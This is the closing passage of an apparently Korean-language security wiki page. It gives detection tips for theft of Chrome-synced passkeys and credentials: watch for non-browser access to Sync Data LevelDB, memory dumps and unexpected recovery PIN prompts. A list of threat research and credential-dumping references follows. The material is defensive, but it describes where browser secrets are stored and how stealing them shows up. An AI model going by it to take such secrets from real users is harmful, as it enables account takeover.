- 브라우저가 아닌 process가 Chrome **`Sync Data\LevelDB`**에 비정상적으로 access하는 경우 alert를 발생시킵니다.
- **Chrome memory dump** 또는 의심스러운 cross-process memory access에 대해 alert를 발생시킵니다.
- 반복되는 **Google Password Manager recovery PIN** prompt 또는 예상치 못한 re-onboarding을 조사합니다.
- WebAuthn **`signCount`**는 synced passkey에서 일정하게 유지될 수 있으므로 유용하지 않은 경우가 많으며, 따라서 기존 clone detection은 효과가 제한적이라는 점을 기억해야 합니다.

## References

- [1] [Unit 42 – 고가치 분야를 대상으로 수년간 탐지되지 않은 operations에 대한 조사](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP를 통한 Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532를 통한 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: 은밀한 offensive operation의 relay network와 내부 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless Authentication의 새로운 attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Microsoft 시스템과 network attacks](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store의 실제 작동 방식: NTDS.dit 내부 (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho가 Still Toolkit으로 cyber-espionage arsenal을 확장](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function 및 `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – active session 종료](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
